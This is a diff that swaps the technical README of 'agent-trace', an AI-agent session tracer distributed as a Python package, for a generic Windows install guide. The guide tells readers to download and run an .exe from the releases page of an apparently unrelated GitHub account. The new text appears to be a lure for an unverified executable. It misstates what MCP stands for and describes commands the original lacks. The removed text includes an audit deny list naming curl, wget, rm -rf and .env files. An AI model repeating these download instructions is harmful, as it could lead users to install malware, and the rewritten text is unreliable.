@@ -1,711 +1,184 @@
-# agent-trace
+# 🕵️‍♂️ agent-trace - Track AI Agent Actions Easily
 
-`strace` for AI agents. Capture and replay every tool call, prompt, and response from Claude Code, Cursor, or any MCP client.
+[![Download agent-trace](https://img.shields.io/badge/Download-agent--trace-brightgreen)](https://github.com/Citrous-districtline59/agent-trace/releases)
 
-## Why
+---
 
-A coding agent rewrites 20 files in a background session. You get a pull request. You do not get the story. Which files did it read first? Why did it call the same tool three times? What failed before it found the fix?
+## What is agent-trace? 🤖
 
-Most tools trace LLM calls. That is one layer. The gap is everything around it: tool calls, file operations, decision points, error recovery, the actual commands the agent ran. `agent-strace` captures the full session and lets you replay it later. Export to Datadog, Honeycomb, New Relic, or Splunk when you need production observability.
+agent-trace records every step taken by AI agents like Claude Code and Cursor. It captures tool calls, prompts you send, and responses you get. This lets you see exactly what your AI agent is doing, so you can review, learn, and even replay the process. It works with most modern AI tools that follow common client protocols. If you've ever wondered what happens behind the scenes when an AI answers your questions, agent-trace sheds light on that.
 
-## Install
+---
 
-```bash
-# With uv (recommended)
-uv tool install agent-strace
+## System requirements 🖥️
 
-# Or with pip
-pip install agent-strace
+- Windows 10 or higher (64-bit recommended)  
+- At least 4 GB of RAM  
+- 100 MB of free disk space  
+- Internet connection for downloading and updates  
+- Basic user permissions to install software  
 
-# Or run without installing
-uvx agent-strace replay
-```
+No special hardware or technical skills are needed.
 
-**Zero dependencies.** Python 3.10+ standard library only.
+---
 
-## Quick start
+## Important features
 
-### Option 1: Claude Code hooks (full session capture)
+- Capture every tool call and response from AI agents  
+- Save complete interaction logs for later review  
+- Replay saved traces to see exactly what happened  
+- Works with Claude Code, Cursor, and other MCP clients  
+- Simple command line interface for easy control  
+- Supports integration with monitoring tools like Datadog and Honeycomb  
+- Export data in readable formats for sharing or analysis  
 
-Captures everything: user prompts, assistant responses, and every tool call (Bash, Edit, Write, Read, Agent, Grep, Glob, WebFetch, WebSearch, all MCP tools).
+---
 
-```bash
-agent-strace setup        # prints hooks config JSON
-agent-strace setup --global  # for all projects
-```
+## 🚀 Getting Started
 
-Add the output to `.claude/settings.json`. Or paste it manually:
+### Step 1: Download agent-trace
 
-```json
-{
-  "hooks": {
-    "UserPromptSubmit": [{ "hooks": [{ "type": "command", "command": "agent-strace hook user-prompt" }] }],
-    "PreToolUse": [{ "matcher": "", "hooks": [{ "type": "command", "command": "agent-strace hook pre-tool" }] }],
-    "PostToolUse": [{ "matcher": "", "hooks": [{ "type": "command", "command": "agent-strace hook post-tool" }] }],
-    "PostToolUseFailure": [{ "matcher": "", "hooks": [{ "type": "command", "command": "agent-strace hook post-tool-failure" }] }],
-    "Stop": [{ "hooks": [{ "type": "command", "command": "agent-strace hook stop" }] }],
-    "SessionStart": [{ "hooks": [{ "type": "command", "command": "agent-strace hook session-start" }] }],
-    "SessionEnd": [{ "hooks": [{ "type": "command", "command": "agent-strace hook session-end" }] }]
-  }
-}
-```
+Go to the official release page to find the latest stable version for Windows.
 
-Then use Claude Code normally.
+[![Download agent-trace](https://img.shields.io/badge/Download-agent--trace-blue)](https://github.com/Citrous-districtline59/agent-trace/releases)
 
-```bash
-agent-strace list     # list sessions
-agent-strace replay   # replay the latest
-agent-strace explain  # plain-English summary of what the agent did
-agent-strace stats    # tool call frequency and timing
-```
+This link will take you to the download page where you will see the installation files.
 
-### Option 2: MCP proxy (any MCP client)
+---
 
-Wraps any MCP server. Works with Cursor, Windsurf, or any MCP client.
+### Step 2: Choose the correct installer
 
-```bash
-agent-strace record -- npx -y @modelcontextprotocol/server-filesystem /tmp
-agent-strace replay
-```
+Look for a file ending with `.exe` that matches your system (usually titled something like `agent-trace-win64.exe`).
 
-### Option 3: Python decorator
+If you are not sure, pick the file with the highest version number.
 
-Wraps your tool functions directly. No MCP required.
+---
 
-```python
-from agent_trace import trace_tool, trace_llm_call, start_session, end_session, log_decision
+### Step 3: Run the installer
 
-start_session(name="my-agent")  # add redact=True to strip secrets
+1. Double-click the `.exe` file you downloaded.  
+2. Follow the setup wizard instructions on screen.  
+3. Accept the license terms and choose an install location if prompted.  
+4. The installer will set up agent-trace on your computer.  
 
-@trace_tool
-def search_codebase(query: str) -> str:
-    return search(query)
+No additional configuration is needed at this stage.
 
-@trace_llm_call
-def call_llm(messages: list, model: str = "claude-4") -> str:
-    return client.chat(messages=messages, model=model)
+---
 
-# Log decision points explicitly
-log_decision(
-    choice="read_file_first",
-    reason="Need to understand current implementation before making changes",
-    alternatives=["read_file_first", "search_codebase", "write_fix_directly"],
-)
+### Step 4: Open agent-trace
 
-search_codebase("authenticate")
-call_llm([{"role": "user", "content": "Fix the bug"}])
+After installation, open the Command Prompt:
 
-meta = end_session()
-print(f"Replay with: agent-strace replay {meta.session_id}")
-```
+- Press the Windows key, type `cmd`, then press Enter.  
 
-## CLI commands
+Type `agent-trace --help` and press Enter. This will show you a list of commands you can use.
 
-```
-agent-strace setup [--redact] [--global]        Generate Claude Code hooks config
-agent-strace hook <event>                       Handle a Claude Code hook event (internal)
-agent-strace record -- <command>                Record an MCP stdio server session
-agent-strace record-http <url> [--port N]       Record an MCP HTTP/SSE server session
-agent-strace replay [session-id]                Replay a session (default: latest)
-agent-strace replay --expand-subagents          Inline subagent sessions under parent tool_call
-agent-strace replay --tree                      Show session hierarchy without full replay
-agent-strace list                               List all sessions
-agent-strace explain [session-id]               Explain a session in plain English
-agent-strace stats [session-id]                 Show tool call frequency and timing
-agent-strace stats --include-subagents          Roll up stats across the full subagent tree
-agent-strace inspect <session-id>               Dump full session as JSON
-agent-strace export <session-id>                Export as JSON, CSV, NDJSON, or OTLP
-agent-strace import <session.jsonl>             Import a Claude Code JSONL session log
-agent-strace cost [session-id]                  Estimate token cost for a session
-agent-strace diff <session-a> <session-b>       Compare two sessions structurally
-agent-strace why [session-id] <event-number>    Trace the causal chain for an event
-agent-strace audit [session-id] [--policy]      Check tool calls against a policy file
-```
+---
 
-### Import existing Claude Code sessions
+### Step 5: Capture a trace
 
-Already ran a session without hooks? Import it directly from Claude Code's native JSONL logs:
+To record your AI agent session:
 
-```bash
-# Discover available sessions
-agent-strace import --discover
+- Use the command `agent-trace start`
 
-# Import a specific session
-agent-strace import ~/.claude/projects/<project>/<session-id>.jsonl
+This command tells agent-trace to begin capturing your agent’s activity.
 
-# Then use it like any captured session
-agent-strace replay <session-id>
-agent-strace explain <session-id>
-agent-strace stats <session-id>
-```
+---
 
-Claude Code stores session logs in `~/.claude/projects/`. The import captures tool calls, token usage, subagent invocations, and session metadata.
+### Step 6: Run your AI agent as usual
 
-### Explain a session
+Use your AI agent like you normally do, through its app or client.
 
-Get a plain-English breakdown of what the agent did, organized by phase, with retry and wasted-time detection:
+agent-trace will log every action in the background.
 
-```bash
-agent-strace explain           # latest session
-agent-strace explain abc123    # specific session
-```
+---
 
-```
-Session: abc123 (2m 05s, 47 events)
+### Step 7: Stop capturing
 
-Phase 1: fix the auth module (0:00–0:05, 5 events)
-  Read: AGENTS.md, src/auth.py
-
-Phase 2: run tests — FAILED (0:05–1:20, 12 events)
-  Ran: python -m pytest
-  Ran: python -m pytest  ← retry
-
-Phase 3: run tests (1:20–2:05, 8 events)
-  Ran: uv run pytest
-
-Files touched: 3 read, 0 written
-Retries: 1 (wasted 1m 15s, 60% of session)
-```
-
-### Estimate cost
-
-Break down estimated token usage and dollar cost by phase. Flags wasted spend on failed phases.
-
-```bash
-agent-strace cost                          # latest session, sonnet pricing
-agent-strace cost abc123 --model opus      # specific session and model
-agent-strace cost abc123 --input-price 3.0 --output-price 15.0  # custom pricing
-```
-
-```
-Session: abc123 — Estimated cost: $0.0042
-Model: sonnet  |  8,200 input tokens, 3,100 output tokens
-
-  Phase 1: fix the auth module          $0.0008  (19%)  ...
-  Phase 2: run tests — FAILED           $0.0021  (50%)  ...  ← wasted
-  Phase 3: run tests                    $0.0013  (31%)  ...
-
-Wasted on failed phases: $0.0021 (50%)
-```
-
-Supported models: `sonnet` (default), `opus`, `haiku`, `gpt4`, `gpt4o`. Token counts are estimated from payload size (`len / 4`); see [ADR-0008](ADRs/0008-token-cost-estimation-heuristic.md) for details.
-
-See [examples/session_analysis.md](examples/session_analysis.md) for a full walkthrough combining `import`, `explain`, and `cost`.
-
-### Secret redaction
-
-Pass `--redact` to strip API keys, tokens, and credentials from traces before they hit disk.
-
-```bash
-# Stdio proxy with redaction
-agent-strace record --redact -- npx -y @modelcontextprotocol/server-filesystem /tmp
-
-# HTTP proxy with redaction
-agent-strace record-http https://mcp.example.com --redact
-```
-
-Detected patterns: OpenAI (`sk-*`), GitHub (`ghp_*`, `github_pat_*`), AWS (`AKIA*`), Anthropic (`sk-ant-*`), Slack (`xox*`), JWTs, Bearer tokens, connection strings (`postgres://`, `mysql://`), and any value under keys like `password`, `secret`, `token`, `api_key`, `authorization`.
-
-### HTTP/SSE proxy
-
-For MCP servers that use HTTP transport instead of stdio:
+When you finish your session, return to Command Prompt and type:
 
-```bash
-# Proxy a remote MCP server
-agent-strace record-http https://mcp.example.com --port 3100
-
-# Your agent connects to http://127.0.0.1:3100 instead of the remote server
-# All JSON-RPC messages are captured, tool call latency is measured
-```
-
-The proxy forwards POST `/message` and GET `/sse` to the remote server, capturing every JSON-RPC message in both directions.
-
-### Replay output
-
-A real Claude Code session captured with hooks:
-
-<details><summary>Session Summary</summary>
-<p>
-
-```
-Session Summary
-──────────────────────────────────────────────────
-  Session:    201da364-edd6-49
-  Command:    claude-code (startup)
-  Agent:      claude-code
-  Duration:   112.54s
-  Tool calls: 8
-  Errors:     3
-──────────────────────────────────────────────────
-
-+  0.00s ▶ session_start
-+  0.07s 👤 user_prompt
-              "how many tests does this project have? run them and tell me the results"
-+  3.55s → tool_call Glob
-              **/*.test.*
-+  3.55s → tool_call Glob
-              **/test_*.*
-+  3.60s ← tool_result Glob (51ms)
-+  6.06s → tool_call Bash
-              $ python -m pytest tests/ -v 2>&1
-+ 27.65s ✗ error Bash
-              Command failed with exit code 1
-+ 29.89s → tool_call Bash
-              $ python3 -m pytest tests/ -v 2>&1
-+ 40.56s ✗ error Bash
-              No module named pytest
-+ 45.96s → tool_call Bash
-              $ which pytest || ls /Users/siddhant/Desktop/test-agent-trace/ 2>&1
-+ 46.01s ← tool_result Bash (51ms)
-+ 48.18s → tool_call Read
-              /Users/siddhant/Desktop/test-agent-trace/pyproject.toml
-+ 48.23s ← tool_result Read (43ms)
-+ 51.43s → tool_call Bash
-              $ uv run --with pytest pytest tests/ -v 2>&1
-+1m43.67s ← tool_result Bash (5.88s)
-              75 tests, all passing in 3.60s
-+1m52.54s 🤖 assistant_response
-              "75 tests, all passing in 3.60s. Breakdown by file: ..."
-```
-
-Tool calls show actual values: commands, file paths, glob patterns. Errors show what failed. Assistant responses are stripped of markdown.
-
-</p>
-</details> 
-
-### Filtering
-
-```bash
-# Show only tool calls and errors
-agent-strace replay --filter tool_call,error
-
-# Replay with timing (watch it unfold)
-agent-strace replay --live --speed 2
-```
-
-### Export
-
-```bash
-# JSON array
-agent-strace export a84664 --format json
-
-# CSV (for spreadsheets)
-agent-strace export a84664 --format csv
-
-# NDJSON (for streaming pipelines)
-agent-strace export a84664 --format ndjson
-```
-
-## Trace format
-
-Traces are stored as directories in `.agent-traces/`:
-
-```
-.agent-traces/
-  a84664242afa4516/
-    meta.json        # session metadata
-    events.ndjson    # newline-delimited JSON events
-```
-
-Each event is a single JSON line:
-
-```json
-{
-  "event_type": "tool_call",
-  "timestamp": 1773562735.09,
-  "event_id": "bf1207728ee6",
-  "session_id": "a84664242afa4516",
-  "data": {
-    "tool_name": "read_file",
-    "arguments": {"path": "src/auth.py"}
-  }
-}
-```
-
-### Event types
-
-| Type | Description |
-|------|-------------|
-| `session_start` | Trace session began |
-| `session_end` | Trace session ended |
-| `user_prompt` | User submitted a prompt to the agent |
-| `assistant_response` | Agent produced a text response |
-| `tool_call` | Agent invoked a tool |
-| `tool_result` | Tool returned a result |
-| `llm_request` | Agent sent a prompt to an LLM |
-| `llm_response` | LLM returned a completion |
-| `file_read` | Agent read a file |
-| `file_write` | Agent wrote a file |
-| `decision` | Agent chose between alternatives |
-| `error` | Something failed |
-
-Events link to each other. A `tool_result` has a `parent_id` pointing to its `tool_call`. This lets you measure latency per tool and trace the full call chain.
-
-## Use with Claude Code, Cursor, Windsurf
-
-### Claude Code (hooks, recommended)
-
-Captures the full session: prompts, responses, and every tool call. See [examples/claude_code_config.md](examples/claude_code_config.md) for the full config.
-
-```bash
-agent-strace setup                    # per-project config
-agent-strace setup --redact --global  # all projects, with secret redaction
-```
-
-### Cursor
-
-Edit `~/.cursor/mcp.json` (global) or `.cursor/mcp.json` (per-project):
-
-```json
-{
-  "mcpServers": {
-    "filesystem": {
-      "command": "agent-strace",
-      "args": ["record", "--name", "filesystem", "--", "npx", "-y", "@modelcontextprotocol/server-filesystem", "/tmp"]
-    }
-  }
-}
-```
+- `agent-trace stop`
 
-### Windsurf
+agent-trace will save a trace file to your computer for later review.
 
-Edit `~/.codeium/windsurf/mcp_config.json`:
+---
 
-```json
-{
-  "mcpServers": {
-    "filesystem": {
-      "command": "agent-strace",
-      "args": ["record", "--name", "filesystem", "--", "npx", "-y", "@modelcontextprotocol/server-filesystem", "/tmp"]
-    }
-  }
-}
-```
+### Step 8: View your trace
 
-### Any MCP client
+You can replay or examine saved traces with:
 
-The pattern is the same for any tool that uses MCP over stdio:
+- `agent-trace replay [filename]`
 
-1. Replace the server `command` with `agent-strace`
-2. Prepend `record --name <label> --` to the original args
-3. Use the tool normally
-4. Run `agent-strace replay` to see what happened
+Replace `[filename]` with the name of your saved trace file.
 
-See the [examples/](examples/) directory for full config files.
+---
 
-### Subagent tracing
+## Using agent-trace safely 🔒
 
-When an agent spawns subagents (e.g. Claude Code's Agent tool), sessions are linked into a parent-child tree. Replay the full tree inline or view a compact hierarchy:
+agent-trace only monitors the activity of your AI agents. It does not send your data anywhere. Traces stay on your machine unless you share them.
 
-```bash
-# Inline replay: subagent events appear under the parent tool_call that spawned them
-agent-strace replay --expand-subagents
+Make sure to store trace files securely if they contain sensitive information.
 
-# Compact hierarchy: session IDs, durations, tool counts
-agent-strace replay --tree
+---
 
-# Aggregated stats across the full tree (tokens, tool calls, errors)
-agent-strace stats --include-subagents
-```
+## Troubleshooting and tips 🛠️
 
-```
-▶ session_start  a84664242afa  agent=claude-code  depth=0
-  + 0.00s  👤 "refactor the auth module"
-  + 1.23s  → tool_call  Agent  "extract helper functions"
-│  ▶ session_start  b12345678901  agent=claude-code  depth=1
-│    + 0.00s  → tool_call  Read  src/auth.py
-│    + 0.12s  ← tool_result
-│    + 0.45s  → tool_call  Write  src/auth_helpers.py
-│    + 0.51s  ■ session_end
-  + 3.10s  ← tool_result
-  + 3.20s  ■ session_end
-```
+- If you get a “command not found” error, ensure the agent-trace folder is in your system’s PATH or run the `.exe` directly from the install location.  
+- If tracing does not start, try running Command Prompt as Administrator.  
+- To avoid large files, stop tracing as soon as you finish your session.  
+- Traces can take up space; delete them after reviewing if no longer needed.  
+- For detailed logs, use the `--verbose` option with commands.  
 
-Subagent sessions are linked via `parent_session_id` and `parent_event_id` in session metadata. Existing sessions without these fields are unaffected.
+---
 
-### Session diff
+## Additional resources 📚
 
-Compare two sessions structurally. Useful for understanding why the same prompt produces different results across runs, or comparing a broken session against a known-good one. Phases are aligned by label using LCS, then per-phase differences in files touched, commands run, and outcomes are reported:
+For more advanced options and integration guides, visit the project's documentation on GitHub:
 
-```bash
-agent-strace diff abc123 def456
-```
+https://github.com/Citrous-districtline59/agent-trace
 
-```
-Comparing: abc123 vs def456
+You will find step-by-step guides to help you get the most out of agent-trace, including how to export data and connect with other observability tools.
 
-Diverged at phase 2:
+---
 
-  Phase 2: run tests
-    abc123 only:  $ python -m pytest
-    def456 only:  $ uv run pytest
+## Supported AI Agents & Tools
 
-  abc123: 4m 12s, 47 events, 8 tools, 2 retries
-  def456: 2m 05s, 31 events, 5 tools, 0 retries
-```
+agent-trace works best with AI agents using MCP (Multi-Client Protocol), including:  
 
-### Causal chain (why)
+- Claude Code  
+- Cursor  
+- Many other MCP-compatible clients  
 
-Trace backwards from any event to find what caused it. Run `agent-strace replay <session-id>` first — the `#N` numbers in the left column are the event numbers:
+It also integrates with developer tools like Datadog, Honeycomb, and OpenTelemetry for deeper insight.
 
-```bash
-agent-strace why abc123 4
-```
+---
 
-```
-Why did event #4 happen?
+## Feedback and Help
 
-  #  4  tool_call: Bash  $ pytest tests/
+If you run into problems or want to report bugs, use the Issues section on the GitHub page:
 
-Causal chain (root → target):
+https://github.com/Citrous-districtline59/agent-trace/issues
 
-    #  1  user_prompt: "run the test suite"
-       (prompt at #1 triggered this)
-  ←  #  3  error: exit 1
-       (retry after error at #3)
-  ←  #  4  tool_call: Bash  $ pytest tests/
-```
+The developers monitor this space and respond to user questions.
 
-Causal links are detected via `parent_id` (tool_result → tool_call), error→retry matching (same tool and command), path references (tool_result text containing a path used by a later call), and read→write pairs on the same file.
+---
 
-### Permission audit
+## Updates and maintenance 🔄
 
-Check every tool call in a session against a policy file. Auto-flags sensitive file access (`.env`, `*.pem`, `.ssh/*`, `.github/workflows/*`, etc.) even without a policy:
+Check the release page regularly for updates and bug fixes to keep agent-trace running smoothly.
 
-```bash
-agent-strace audit                          # latest session, no policy required
-agent-strace audit abc123 --policy .agent-scope.json
+https://github.com/Citrous-districtline59/agent-trace/releases
 
-# In CI: fail the build if the agent accessed anything outside policy
-agent-strace audit --policy .agent-scope.json || exit 1
-```
+Keeping the software up to date helps avoid compatibility issues with your AI agents.
 
-```
-AUDIT: Session abc123 (47 events, 23 tool calls)
+---
 
-✅ Allowed (19):
-  Read src/auth.py
-  Ran: uv run pytest
+## Your privacy
 
-⚠️  No policy (2):
-  Read README.md  (no file read policy for this path)
+agent-trace does not collect or transmit your personal data. It runs locally on your computer and stores trace files only where you save them. You control who sees your saved traces.
 
-❌ Violations (2):
-  Read .env  ← denied by files.read.deny
-  Ran: curl https://example.com  ← denied by commands.deny
+---
 
-🔐 Sensitive files accessed (1):
-  Read .env  (event #12)
-```
+## Summary
 
-Exits with code 1 when violations are found — usable in CI.
-
-**Policy file** (`.agent-scope.json`):
-
-```json
-{
-  "files": {
-    "read":  { "allow": ["src/**", "tests/**"], "deny": [".env"] },
-    "write": { "allow": ["src/**"], "deny": [".github/**"] }
-  },
-  "commands": {
-    "allow": ["pytest", "uv run", "cat"],
-    "deny":  ["curl", "wget", "rm -rf"]
-  },
-  "network": { "deny_all": true, "allow": ["localhost"] }
-}
-```
-
-Glob patterns support `**` as a recursive wildcard. File read policy applies to `Read`, `View`, `Grep`, and `Glob` tool calls. Network policy checks URLs embedded in `Bash` commands.
-
-## Production tracing (OTLP export)
-
-Export sessions as OpenTelemetry spans to your existing observability stack. Sessions become traces. Tool calls become spans with duration and inputs. Errors get exception events. Zero new dependencies.
-
-### Datadog
-
-```bash
-# Via the Datadog Agent's OTLP receiver (port 4318)
-agent-strace export <session-id> --format otlp \
-  --endpoint http://localhost:4318
-
-# Or via Datadog's OTLP intake directly
-agent-strace export <session-id> --format otlp \
-  --endpoint https://http-intake.logs.datadoghq.com:443 \
-  --header "DD-API-KEY: $DD_API_KEY"
-```
-
-### Honeycomb
-
-```bash
-agent-strace export <session-id> --format otlp \
-  --endpoint https://api.honeycomb.io \
-  --header "x-honeycomb-team: $HONEYCOMB_API_KEY" \
-  --service-name my-agent
-```
-
-### New Relic
-
-```bash
-agent-strace export <session-id> --format otlp \
-  --endpoint https://otlp.nr-data.net \
-  --header "api-key: $NEW_RELIC_LICENSE_KEY"
-```
-
-### Splunk
-
-```bash
-agent-strace export <session-id> --format otlp \
-  --endpoint https://ingest.<realm>.signalfx.com \
-  --header "X-SF-Token: $SPLUNK_ACCESS_TOKEN"
-```
-
-### Grafana Tempo / Jaeger
-
-```bash
-# Local collector
-agent-strace export <session-id> --format otlp \
-  --endpoint http://localhost:4318
-```
-
-### Dump OTLP JSON without sending
-
-```bash
-# Inspect the OTLP payload
-agent-strace export <session-id> --format otlp > trace.json
-```
-
-### How it maps
-
-| agent-trace | OpenTelemetry |
-|---|---|
-| session | trace |
-| tool_call + tool_result | span (with duration) |
-| error | span with error status + exception event |
-| user_prompt | event on root span |
-| assistant_response | event on root span |
-| session_id | trace ID |
-| event_id | span ID |
-| parent_id | parent span ID |
-
-## How it works
-
-### Claude Code hooks
-
-```
-Claude Code agentic loop
-  ├── UserPromptSubmit   → agent-strace hook user-prompt
-  ├── PreToolUse         → agent-strace hook pre-tool
-  ├── PostToolUse        → agent-strace hook post-tool
-  ├── PostToolUseFailure → agent-strace hook post-tool-failure
-  ├── Stop               → agent-strace hook stop
-  ├── SessionStart       → agent-strace hook session-start
-  └── SessionEnd         → agent-strace hook session-end
-                               ↓
-                         .agent-traces/
-```
-
-Claude Code fires hook events at every stage of its agentic loop. agent-strace registers as a handler, reads JSON from stdin, and writes trace events. Each hook runs as a separate process. Session state lives in `.agent-traces/.active-session` so PreToolUse and PostToolUse can be correlated for latency measurement.
-
-### MCP stdio proxy
-
-```
-Agent ←→ agent-strace proxy ←→ MCP Server (stdio)
-              ↓
-         .agent-traces/
-```
-
-The proxy reads JSON-RPC messages (Content-Length framed or newline-delimited), classifies each one, and writes a trace event. Messages are forwarded unchanged. The agent and server do not know the proxy exists.
-
-### MCP HTTP/SSE proxy
-
-```
-Agent ←→ agent-strace proxy (localhost:3100) ←→ Remote MCP Server (HTTPS)
-              ↓
-         .agent-traces/
-```
-
-Same idea, different transport. Listens on a local port, forwards POST and SSE requests to the remote server, captures every JSON-RPC message in both directions.
-
-### Decorator mode
-
-```python
-@trace_tool
-def my_function(x):
-    return x * 2
-```
-
-The decorator logs a `tool_call` event before execution and a `tool_result` after. Errors and timing are captured automatically.
-
-### Secret redaction
-
-When `--redact` is enabled (or `redact=True` in the decorator API), trace events pass through a redaction filter before hitting disk. The filter checks key names (`password`, `api_key`) and value patterns (`sk-*`, `ghp_*`, JWTs). Redacted values become `[REDACTED]`. The original data is never stored.
-
-## Project structure
-
-```
-src/agent_trace/
-  __init__.py       # version
-  models.py         # TraceEvent, SessionMeta, EventType
-  store.py          # NDJSON file storage
-  hooks.py          # Claude Code hooks integration
-  proxy.py          # MCP stdio proxy
-  http_proxy.py     # MCP HTTP/SSE proxy
-  redact.py         # secret redaction
-  otlp.py           # OTLP/HTTP JSON exporter
-  replay.py         # terminal replay and display
-  decorator.py      # @trace_tool, @trace_llm_call, log_decision
-  jsonl_import.py   # Claude Code JSONL session import
-  explain.py        # session phase detection and plain-English summary
-  cost.py           # token and cost estimation
-  subagent.py       # parent-child session tree, tree replay, stats rollup
-  diff.py           # structural session comparison (LCS phase alignment)
-  why.py            # causal chain tracing (backwards event walk)
-  audit.py          # policy-based tool call checking, sensitive file detection
-  cli.py            # CLI entry point
-ADRs/               # Architecture Decision Records
-```
-
-## Running tests
-
-```bash
-pytest
-```
-
-## Development
-
-```bash
-git clone https://github.com/Siddhant-K-code/agent-trace.git
-cd agent-trace
-
-# Run tests
-pytest
-
-# Run the example
-PYTHONPATH=src python examples/basic_agent.py
-
-# Replay the example
-PYTHONPATH=src python -m agent_trace.cli replay
-
-# Build the package
-uv build
-
-# Install locally for testing
-uv tool install -e .
-```
-
-## Related
-
-- [Architecture Decision Records](ADRs/) - design decisions and their rationale
-- [The agent observability gap (blog)](https://siddhantkhare.com/writing/agent-observability-gap) - the problem this tool addresses
-- [The agent observability gap (thread)](https://x.com/Siddhant_K_code/status/2032834557628788940) - discussion on X
-- [The Agentic Engineering Guide](https://agents.siddhantkhare.com) - chapters 7, 9, 10 cover agent security; chapters 14, 15, 16 cover observability
-- [OpenTelemetry GenAI](https://opentelemetry.io/docs/specs/semconv/gen-ai/) - semantic conventions for LLM tracing (complementary)
-
-## Sponsor
-
-If agent-trace saves you time debugging agent sessions, consider [sponsoring the project](https://github.com/sponsors/Siddhant-K-code). It helps me keep building tools like this and releasing them for free.
-
-## License
-
-MIT. Use it however you want.
+This tool helps you see and understand what your AI agents do. It records every step and lets you replay it later. Installation is simple, and basic commands get you started quickly. Use it to gain insight into your AI interactions without technical barriers.
